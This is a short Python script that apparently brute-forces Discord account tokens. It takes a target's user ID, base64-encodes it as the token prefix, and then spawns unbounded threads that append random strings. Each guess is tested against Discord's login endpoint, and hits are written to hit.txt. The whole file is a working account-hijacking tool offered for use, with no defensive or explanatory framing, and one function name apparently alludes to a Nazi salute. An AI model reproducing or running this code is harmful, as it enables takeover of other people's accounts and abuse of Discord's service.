from keep_alive import keep_h
from replportlink import keepalivework
import base64
import random
import string
import requests
import threading
import time
from colorama import Fore






requests = requests.Session()


  
id_to_token = base64.b64encode((input(Fore.MAGENTA + 'ID TO TOKEN --> ')).encode("ascii"))
print(Fore.GREEN + 'starting, by fear')
time.sleep(3.6)
id_to_token = str(id_to_token)[2:-1]


def heil_sag():
 while id_to_token == id_to_token:
    token = id_to_token + '.' + ('').join(random.choices(string.ascii_letters + string.digits, k=4)) + '.' + ('').join(random.choices(string.ascii_letters + string.digits, k=25))
    headers={
        'Authorization': token
    }
    login = requests.get('https://discordapp.com/api/v9/auth/login', headers=headers)
    try:
        if login.status_code == 200:
            print(Fore.GREEN + '[+] VALID' + ' ' + token)
            f = open('hit.txt', "a+")
            f.write(f'{token}')
        else:
            print(Fore.RED + '[-] INVALID' + ' ' + token)
    finally:
        print("")

while 1:
  threading.Thread(target=heil_sag, daemon=True).start()
  threading.Thread(target=heil_sag, daemon=True).start()